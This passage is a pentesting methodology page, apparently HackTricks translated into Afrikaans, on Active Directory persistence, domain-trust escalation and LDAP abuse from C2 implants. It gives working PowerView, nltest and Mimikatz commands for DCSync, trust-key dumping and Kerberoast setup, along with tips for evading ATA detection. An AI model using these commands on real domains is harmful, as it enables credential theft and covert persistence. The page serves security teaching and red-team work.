As **kwetsbare templates** gekonfigureer is, is dit moontlik om hulle te misbruik om voorregte te verhoog:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitasie met 'n hoë voorregte rekening

### Dumping Domain Credentials

Sodra jy **Domain Admin** of beter nog **Enterprise Admin** voorregte kry, kan jy die **domein databasis**: _ntds.dit_ dump.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Sommige van die tegnieke wat vroeër bespreek is, kan gebruik word vir persistence.\
Byvoorbeeld, jy kan:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Die **Silver Ticket attack** skep 'n **geldige Ticket Granting Service (TGS) ticket** vir 'n spesifieke diens deur die gebruik van die **NTLM hash** (byvoorbeeld die **hash van die PC-rekening**). Hierdie metode word gebruik om **toegang tot die diens se voorregte** te verkry.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

'n **Golden Ticket attack** behels dat 'n aanvaller toegang verkry tot die **NTLM hash van die krbtgt-rekening** in 'n Active Directory (AD) omgewing. Hierdie rekening is spesiaal omdat dit gebruik word om alle **Ticket Granting Tickets (TGTs)** te teken, wat noodsaaklik is vir verifikasie binne die AD-netwerk.

Sodra die aanvaller hierdie hash bekom, kan hulle **TGTs** genereer vir enige rekening wat hulle kies (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hierdie is soortgelyk aan golden tickets wat vervals is op 'n wyse wat **gewone golden tickets-detektiemeganismes omseil.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** is 'n baie goeie manier om in 'n gebruiker se rekening te bly (selfs al verander hy die wagwoord):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates is also possible to persist with high privileges inside the domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Die **AdminSDHolder**-objek in Active Directory verseker die sekuriteit van **privileged groups** (soos Domain Admins en Enterprise Admins) deur 'n standaard **Access Control List (ACL)** oor hierdie groepe toe te pas om ongemagtigde wysigings te voorkom. Hierdie funksie kan egter uitgebuit word; as 'n aanvaller die AdminSDHolder se ACL wysig om volle toegang aan 'n gewone gebruiker te gee, verkry daardie gebruiker uitgebreide beheer oor alle bevoorregte groepe. Hierdie sekuriteitsmaatreël, bedoel om te beskerm, kan dus teenproduktief wees, wat ongerechtigde toegang moontlik maak tensy dit noukeurig gemonitor word.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

In elke **Domain Controller (DC)** bestaan 'n **lokale administrator**-rekening. Deur adminregte op so 'n masjien te bekom, kan die plaaslike Administrator-hash met **mimikatz** geëxtraheer word. Daarna is 'n registerwysiging nodig om die gebruik van hierdie wagwoord te **aktiveer**, wat afstands toegang tot die plaaslike Administrator-rekening moontlik maak.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Jy kan aan 'n **gebruiker** spesiale **regte** oor sekere domeinobjekte gee wat die gebruiker in staat sal stel om in die toekoms **voorregte te verhoog**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **security descriptors** word gebruik om die **permissies** wat 'n **voorwerp** oor 'n ander **voorwerp** het te **stoor**. As jy net 'n **klein verandering** in die **security descriptor** van 'n objek kan aanbring, kan jy baie interessante voorregte oor daardie objek kry sonder om lid van 'n bevoorregte groep te wees.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Misbruik die `dynamicObject` hulpklas om kortlewende principals/GPOs/DNS-rekords met `entryTTL`/`msDS-Entry-Time-To-Die` te skep; hulle verwyder hulleself sonder tombstones, uitwis LDAP-bewyse terwyl hulle verweesde SIDs, gebroke `gPLink`-referensies of gekashde DNS-antwoorde agterlaat (bv. AdminSDHolder ACE pollution of kwaadwillige `gPCFileSysPath`/AD-integrated DNS-omleidings).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verander **LSASS** in geheue om 'n **universele wagwoord** te stel, wat toegang tot alle domeinrekeninge verleen.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Jy kan jou **eie SSP** skep om **credentials** wat gebruik word om by die masjien aan te meld in **duidelike teks** vas te vang.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dit registreer 'n **nuwe Domain Controller** in die AD en gebruik dit om **attribuite** (SIDHistory, SPNs...) op gespesifiseerde objek­te **te push** **sonder** om enige **logs** oor die **wysigings** agter te laat. Jy ** benodig DA**-voorregte en moet binne die **root domain** wees.\
Let daarop dat as jy verkeerde data gebruik, lelik sigbare logs kan verskyn.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Vroeger het ons bespreek hoe om voorregte te verhoog as jy genoeg permissies het om LAPS-wagwoorde te lees. Hierdie wagwoorde kan egter ook gebruik word om persistence te handhaaf.\
Sien:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft beskou die **Forest** as die sekuriteitsgrens. Dit impliseer dat **die kompromittering van 'n enkele domein moontlik tot die kompromittering van die hele Forest kan lei**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is 'n sekuriteitsmeganisme wat 'n gebruiker van een **domain** in staat stel om hulpbronne in 'n ander **domain** te gebruik. Dit skep 'n skakel tussen die verifikasiestelsels van die twee domeine, wat verifikasie-toevoere naatloos laat vloei. Wanneer domeine 'n trust opstel, ruil en stoor hulle spesifieke **sleutels** binne hul **Domain Controllers (DCs)** wat noodsaaklik is vir die integriteit van die trust.

In 'n tipiese scenario, indien 'n gebruiker 'n diens in 'n **trusted domain** wil gebruik, moet hy eers 'n spesiale kaartjie aanvra wat bekend staan as 'n **inter-realm TGT** by sy eie domein se DC. Hierdie TGT word gekodeer met 'n gedeelde **key** wat albei domeine ooreengekom het. Die gebruiker bied hierdie TGT dan aan by die **DC van die trusted domain** om 'n service ticket (**TGS**) te kry. Nadat die trusted domain se DC die inter-realm TGT suksesvol gevalideer het, stel dit 'n TGS uit wat die gebruiker toegang tot die diens verleen.

**Stappe**:

1. 'n **client computer** in **Domain 1** begin die proses deur sy **NTLM hash** te gebruik om 'n **Ticket Granting Ticket (TGT)** by sy **Domain Controller (DC1)** aan te vra.
2. DC1 gee 'n nuwe TGT uit as die kliënt suksesvol geverifieer is.
3. Die kliënt vra dan 'n **inter-realm TGT** by DC1 aan, wat nodig is om hulpbronne in **Domain 2** te benut.
4. Die inter-realm TGT word gekodeer met 'n **trust key** wat DC1 en DC2 deel as deel van die two-way domain trust.
5. Die kliënt neem die inter-realm TGT na **Domain 2 se Domain Controller (DC2)**.
6. DC2 verifieer die inter-realm TGT met sy gedeelde trust key en, indien geldig, gee dit 'n **Ticket Granting Service (TGS)** uit vir die bediener in Domain 2 wat die kliënt wil gebruik.
7. Uiteindelik voorsien die kliënt hierdie TGS aan die bediener, wat met die bediener se rekening-hash gekodeer is, om toegang tot die diens in Domain 2 te verkry.

### Different trusts

Dit is belangrik om op te let dat **'n trust 1-weg of 2-weg kan wees**. In die 2-weg opsie vertrou beide domeine mekaar, maar in die **1-weg** trustrelasie sal een van die domeine die **trusted** wees en die ander die **trusting** domein. In laasgenoemde geval sal **jy slegs toegang tot hulpbronne binne die trusting domain van die trusted een af hê**.

As Domain A Domain B vertrou, is A die trusting domain en B die trusted een. Verder, in **Domain A**, sal dit 'n **Outbound trust** wees; en in **Domain B**, sal dit 'n **Inbound trust** wees.

**Different trusting relationships**

- **Parent-Child Trusts**: Dit is 'n algemene opstelling binne dieselfde forest, waar 'n child domain outomaties 'n two-way transitive trust met sy parent domain het. Dit beteken dat verifikasieversoeke naatloos tussen die parent en child kan vloei.
- **Cross-link Trusts**: Genoem "shortcut trusts," hierdie word tussen child domeine opgestel om verwysingsprosesse te versnel. In komplekse forests moet verifikasieverwysings gewoonlik na die forest root gaan en dan af na die teikendomein; cross-links verkort hierdie pad, wat veral nuttig is in geografies verspreide omgewings.
- **External Trusts**: Hierdie word tussen verskillende, ongerelateerde domeine opgestel en is nie-transitief van aard nie. Volgens [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) is external trusts nuttig om toegang tot hulpbronne in 'n domein buite die huidige forest te kry wat nie deur 'n forest trust verbind is nie. Sekuriteit word versterk deur SID-filtering met external trusts.
- **Tree-root Trusts**: Hierdie trusts word outomaties gevestig tussen die forest root domain en 'n nuut bygevoegde boomwortel. Alhoewel dit nie baie algemeen is nie, is tree-root trusts belangrik vir die toevoeging van nuwe domain trees aan 'n forest, wat hulle in staat stel om 'n unieke domeinnaam te behou en two-way transitivity te verseker. Meer inligting is beskikbaar in [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Hierdie soort trust is 'n two-way transitive trust tussen twee forest root domains, en voer ook SID-filtering in om sekuriteitsmaatreëls te verbeter.
- **MIT Trusts**: Hierdie trusts word gevestig met nie-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos-domeine. MIT trusts is meer gespesialiseerd en rig op omgewings wat integrasie met Kerberos-gebaseerde stelsels buite die Windows-ekosisteem benodig.

#### Other differences in **trusting relationships**

- 'n Trust-relasie kan ook **transitief** wees (A vertrou B, B vertrou C, dan vertrou A C) of **nie-transitief**.
- 'n Trust-relasie kan opgestel word as **bidirectional trust** (albei vertrou mekaar) of as **one-way trust** (slegs een vertrou die ander).

### Attack Path

1. **Enureer** die trusting relationships
2. Kyk of enige **security principal** (user/group/computer) **access** het tot hulpbronne van die **ander domain**, moontlik deur ACE-inskrywings of deur lidmaatskap in groepe van die ander domain. Soek **verhoudings oor domeine heen** (die trust is waarskynlik hiervoor geskep).
1. kerberoast in hierdie geval kan 'n ander opsie wees.
3. **Kompromitteer** die **rekeninge** wat deur die domeine **pivot** kan maak.

Aanvallers kan toegang tot hulpbronne in 'n ander domein kry deur drie primêre meganismes:

- **Local Group Membership**: Principals kan by plaaslike groepe op masjiene gevoeg wees, soos die “Administrators” groep op 'n bediener, wat hulle beduidende beheer oor daardie masjien gee.
- **Foreign Domain Group Membership**: Principals kan ook lede van groepe binne die vreemde domein wees. Die effektiwiteit van hierdie metode hang egter af van die aard van die trust en die omvang van die groep.
- **Access Control Lists (ACLs)**: Principals kan in 'n **ACL** gespesifiseer wees, veral as entiteite in **ACEs** binne 'n **DACL**, wat hulle toegang tot spesifieke hulpbronne bied. Vir diegene wat die meganika van ACLs, DACLs en ACEs dieper wil ondersoek, is die whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 'n waardevolle hulpbron.

### Find external users/groups with permissions

Jy kan kyk by **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** om foreign security principals in die domein te vind. Dit sal gebruikers/groepe wees van **'n eksterne domain/forest**.

Jy kan dit in **Bloodhound** of met powerview nagaan:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Ander maniere om domain trusts te enumerate:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Daar is **2 vertroude sleutels**, een vir _Child --> Parent_ en 'n ander vir _Parent_ --> _Child_.\
> Jy kan die een wat deur die huidige domein gebruik word vind met:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escaleer as Enterprise admin na die child/parent-domein deur die trust te misbruik met SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Dit is noodsaaklik om te verstaan hoe die Configuration Naming Context (NC) misbruik kan word. Die Configuration NC dien as 'n sentrale bewaarplek vir konfigurasiedata oor 'n forest in Active Directory (AD)-omgewings. Hierdie data word gerepliseer na elke Domain Controller (DC) binne die forest, met skryfbare DCs wat 'n skryfbare kopie van die Configuration NC behou. Om dit te misbruik het mens **SYSTEM privileges on a DC** nodig, by voorkeur op 'n child DC.

**Link GPO to root DC site**

Die Configuration NC se Sites-container sluit inligting in oor alle domain-joined rekenaars se sites binne die AD forest. Deur met SYSTEM-privileges op enige DC te werk, kan aanvallers GPOs koppel aan die root DC sites. Hierdie aksie kan die root-domein potensieel kompromitteer deur die beleid wat op hierdie sites toegepas word te manipuleer.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Een aanvalsvector behels die teiken van bevoorregte gMSA's binne die domein. Die KDS Root key, essensieel vir die berekening van gMSA-wagwoorde, is gestoor in die Configuration NC. Met SYSTEM-privileges op enige DC is dit moontlik om toegang tot die KDS Root key te kry en die wagwoorde vir enige gMSA oor die hele forest te bereken.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Hierdie metode vereis geduld: wag vir die skepping van nuwe bevoorregte AD-objekte. Met SYSTEM-privileges kan 'n aanvaller die AD Schema wysig om enige gebruiker volledige beheer oor alle classes te gee. Dit kan lei tot ongemagtigde toegang en beheer oor nuut geskepte AD-objekte.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Die ADCS ESC5-kwesbaarheid mik op beheer oor Public Key Infrastructure (PKI)-objekte om 'n sertifikaattemplate te skep wat verifikasie as enige gebruiker binne die forest moontlik maak. Aangesien PKI-objekte in die Configuration NC woon, maak die kompromittering van 'n skryfbare child DC die uitvoering van ESC5-aanvalle moontlik.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenario's sonder ADCS het die aanvaller die vermoë om die nodige komponente op te stel, soos bespreek in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In hierdie scenario **jou domein word vertrou** deur 'n eksterne een wat jou **onbepaalde toestemmings** daaroor gee. Jy sal moet uitvind **watter principals van jou domein watter toegang oor die eksterne domein het** en dan probeer om dit uit te buit:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterne Forest Domain - Eenrigting (Uitgaand)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In hierdie scenario vertrou **jou domein** sekere **voorregte** aan 'n principal van 'n **ander domein**.

Wanneer 'n **domein vertrou word** deur die vertroudende domein, skep die vertroude domein **'n gebruiker** met 'n **voorspelbare naam** wat as **wagwoord die vertroude wagwoord** gebruik. Dit beteken dat dit moontlik is om **'n gebruiker van die vertroudende domein te gebruik om die vertroude domein binne te kom** om dit te ontleed en te probeer meer voorregte te eskaleer:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Nog 'n manier om die vertroude domein te kompromitteer is om 'n [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) te vind wat in die **teenoorgestelde rigting** van die domeinvertroue geskep is (wat nie baie algemeen is nie).

Nog 'n manier om die vertroude domein te kompromitteer is om in 'n masjien te wag waarop 'n **gebruiker van die vertroude domein toegang het** om via **RDP** aan te meld. Dan kan die aanvaller kode in die RDP-sessieproses inlas en **daarvandaan toegang tot die oorsprongdomein van die slagoffer kry**.\
Boonop, as die **slagoffer sy hardeskyf aangekoppel het**, kan die aanvaller vanaf die **RDP-sessie** proses **backdoors** in die **opstartgids van die hardeskyf** stoor. Hierdie tegniek word **RDPInception** genoem.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigering van domeinvertrou-misbruik

### **SID Filtering:**

- Die risiko van aanvalle wat die SID history-attribuut oor forest trusts benut, word beperk deur SID Filtering, wat standaard geaktiveer is op alle inter-forest trusts. Dit berus op die aanname dat intra-forest trusts veilig is, en beskou die forest eerder as die sekuriteitsgrens as die domain, volgens Microsoft se standpunt.
- Daar is egter 'n vang: SID filtering kan toepassings en gebruikers toegang versteur, wat soms tot deaktivering daarvan lei.

### **Selective Authentication:**

- Vir inter-forest trusts verseker die gebruik van Selective Authentication dat gebruikers van die twee forests nie outomaties geverifieer word nie. In plaas daarvan is eksplisiete toestemmings nodig sodat gebruikers toegang tot domeine en bedieners binne die vertroudende domein of forest kan kry.
- Dit is belangrik om te let dat hierdie maatreëls nie beskerming bied teen die misbruik van die writable Configuration Naming Context (NC) of teen aanvalle op die trust account nie.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-gebaseerde AD-misbruik vanaf On-Host Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) herimplementeer bloodyAD-style LDAP primitives as x64 Beacon Object Files wat heeltemal binne 'n on-host implant (bv. Adaptix C2) loop. Operateurs kompileer die pakket met `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laai `ldap.axs`, en roep dan `ldap <subcommand>` vanaf die beacon. Alle verkeer gebruik die huidige aanmeld-sekuriteitskonteks oor LDAP (389) met signing/sealing of LDAPS (636) met outomatiese sertifikaatvertroue, so geen socks-proxies of skyfartefakte is benodig nie.

### Implant-side LDAP enumerasie

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, en `get-groupmembers` los kortname/OU-paaie op in volle DNs en dump die ooreenstemmende voorwerpe.
- `get-object`, `get-attribute`, en `get-domaininfo` haal arbitrêre attributes (insluitend security descriptors) plus die forest/domain metadata vanaf `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, en `get-rbcd` openbaar roasting kandidaten, delegation-instellings, en bestaande [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors direk vanaf LDAP.
- `get-acl` en `get-writable --detailed` parse die DACL om trustees, regte (GenericAll/WriteDACL/WriteOwner/attribute writes), en erfenis op te som, wat onmiddellike teikens vir ACL privilege escalation verskaf.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) laat die operator nuwe prinsipale of masjienrekeninge plaas waar OU-regte bestaan. `add-groupmember`, `set-password`, `add-attribute`, en `set-attribute` kap teikens direk sodra write-property regte gevind word.
- ACL-focused commands soos `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, en `add-dcsync` vertaal WriteDACL/WriteOwner op enige AD-objek in password resets, group membership control, of DCSync replication privileges sonder om PowerShell/ADSI artefakte te laat. `remove-*` eweknieë skoon opgevoegde ACEs op.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` maak `n gekompromitteerde gebruiker onmiddellik Kerberoastable; `add-asreproastable` (UAC toggle) merk dit vir AS-REP roasting sonder om die wagwoord aan te raak.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) herskryf `msDS-AllowedToDelegateTo`, UAC flags, of `msDS-AllowedToActOnBehalfOfOtherIdentity` vanaf die beacon, wat constrained/unconstrained/RBCD aanvalspaaie moontlik maak en die behoefte aan remote PowerShell of RSAT uitskakel.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` injects privileged SIDs in `n beheerde prinsipaal se SID-history (sien [SID-History Injection](sid-history-injection.md)), wat stilletjies toegangserwe oor LDAP/LDAPS verskaf.
- `move-object` verander die DN/OU van rekenaars of gebruikers, wat `n aanvaller toelaat om bates na OUs te skuif waar gedelegeerde regte reeds bestaan voordat `set-password`, `add-groupmember`, of `add-spn` misbruik word.
- Nou geskoepte verwyderingskommando's (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ens.) laat vinnige rollback toe nadat die operator credentials of persistence ingesamel het, wat telemetry tot `n minimum beperk.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Dit word aanbeveel dat Domain Admins slegs toegelaat word om by Domain Controllers aan te meld, en nie op ander hosts gebruik word nie.
- **Service Account Privileges**: Dienste moet nie met Domain Admin (DA) voorregte geloop word nie om sekuriteit te handhaaf.
- **Temporal Privilege Limitation**: Vir take wat DA-privilege benodig, moet die duur beperk word. Dit kan bereik word met: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit Event IDs 2889/3074/3075 monitor en daarna LDAP signing plus LDAPS channel binding op DCs/clients afdwing om LDAP MITM/relay pogings te blokkeer.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Implementering van deception behels die stel van lokvalle, soos decoy users of computers, met eienskappe soos wagwoorde wat nie verstryk nie of wat as Trusted for Delegation gemerk is. `n Gedetaileerde benadering sluit in die skep van gebruikers met spesifieke regte of om hulle by hoë-privilege groepe te voeg.
- `n Praktiese voorbeeld behels die gebruik van gereedskap soos: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Meer oor die ontplooiing van deception techniques is te vinde by [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Verdagte aanwysers sluit in atypiese ObjectSID, selde logons, skeppingsdatums, en lae bad password tellye.
- **General Indicators**: Deur vergelyking van attributen van potensiële decoy-objekte met dié van egte kan inkonsekwenthede verras. Gereedskap soos [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) kan help om sulke deceptions te identifiseer.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Vermy sessie-enumerasie op Domain Controllers om ATA-detectie te voorkom.
- **Ticket Impersonation**: Die gebruik van **aes** sleutels vir ticket-creating help om detectie te ontduik deur nie na NTLM af te gradeer nie.
- **DCSync Attacks**: Uitvoering vanaf `n nie-Domain Controller` word aanbeveel om ATA-detectie te vermy, aangesien direkte uitvoering vanaf `n Domain Controller` waarskuwings sal veroorsaak.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
